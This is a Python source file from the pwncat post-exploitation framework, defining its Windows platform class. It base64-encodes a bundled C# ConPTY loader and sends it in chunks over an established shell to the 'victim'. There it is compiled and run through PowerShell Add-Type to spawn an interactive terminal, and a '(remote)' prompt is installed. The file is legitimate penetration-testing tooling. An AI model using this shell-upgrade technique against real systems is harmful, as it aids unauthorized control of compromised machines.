#!/usr/bin/env python3
from io import TextIOWrapper, BufferedIOBase, UnsupportedOperation
import pkg_resources
import pathlib
import base64
import time
import os

import pwncat
import pwncat.subprocess
from pwncat.platform import Platform, PlatformError, Path


class PopenWindows(pwncat.subprocess.Popen):
    """
    Windows-specific Popen wrapper class
    """


class WindowsReader(BufferedIOBase):
    """
    A file-like object which wraps a Popen object to enable reading a
    remote file.
    """


class WindowsWriter(BufferedIOBase):
    """A wrapper around an active Popen object which is writing to
    a file. Remote files are not seekable, and cannot be simultaneous
    read/write."""


class Windows(Platform):
    """Concrete platform class abstracting interaction with a Windows/
    Powershell remote host. The remote windows host must support
    powershell for this platform to function, and the channel must be
    established with an open powershell session."""

    PATH_TYPE = pathlib.PureWindowsPath

    def __init__(
        self,
        session: "pwncat.session.Session",
        channel: pwncat.channel.Channel,
        log: str = None,
    ):
        super().__init__(session, channel, log)

        self.name = "windows"

        # Initialize interactive tracking
        self._interactive = False

        # Ensure history is disabled (this does not help logging!)
        # self.disable_history()

        # Most Windows connections aren't capable of a PTY, and checking
        # is difficult this early. We will assume there isn't one.
        self.has_pty = False

        # Trigger allocation of a pty. Because of powershell and windows
        # being unpredictable and weird, we basically *need* this. So,
        # we trigger it initially. WinAPI is available everywhere so on
        # any relatively recent version of windows, this should be fine.
        self.get_pty()

    def get_pty(self):
        """ Spawn a PTY in the current shell. """

        if self.has_pty:
            return

        cols, rows = os.get_terminal_size()

        # Read the C# used to spawn a conpty
        conpty_path = pkg_resources.resource_filename("pwncat", "data/conpty.cs")
        with open(conpty_path, "rb") as filp:
            source = filp.read()

        source = source.replace(b"ROWS", str(rows).encode("utf-8"))
        source = source.replace(b"COLS", str(cols).encode("utf-8"))

        # base64 encode the source
        source = base64.b64encode(source)
        CHUNK_SZ = 1024

        # Initialize victim source variable
        self.channel.send(b'$source = ""\n')

        # Chunk the source in 64-byte pieces
        for idx in range(0, len(source), CHUNK_SZ):
            chunk = source[idx : idx + CHUNK_SZ]
            self.channel.send(b'$source = $source + "' + chunk + b'"\n')
            time.sleep(0.1)

        # decode the source
        self.channel.send(
            b"$source = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($source))\n"
        )

        # Compile and execute
        self.channel.send(
            b"\n".join(
                [
                    b"Add-Type -TypeDefinition $source -Language CSharp",
                    b'[ConPtyShellMainClass]::ConPtyShellMain(@("", 0, 24, 80, "powershell.exe")); exit',
                ]
            )
            + b"\n"
        )

        self.channel.recvuntil(b"> ")
        self.channel.send(b"\n")

        self.has_pty = True

    def get_host_hash(self):
        return "windows-testing"

    @property
    def interactive(self):
        return self._interactive

    @interactive.setter
    def interactive(self, value):

        if value:

            command = (
                "".join(
                    [
                        "function global:prompt {",
                        'Write-Host -Object "(remote) " -NoNewLine -ForegroundColor Red;',
                        'Write-Host -Object "$env:UserName@$(hostname)" -NoNewLine -ForegroundColor Yellow;',
                        'Write-Host -Object ":" -NoNewLine;',
                        'Write-Host -Object "$(Get-Location)" -NoNewLine -ForegroundColor Cyan;',
                        "return '$ ';",
                        "}",
                    ]
                )
                + "\r\r"
            )

            self.logger.info(command.rstrip("\n"))
            self.channel.send(command.encode("utf-8"))

            self.channel.recvuntil(b"$")
            self.channel.recvuntil(b"\n")

            return
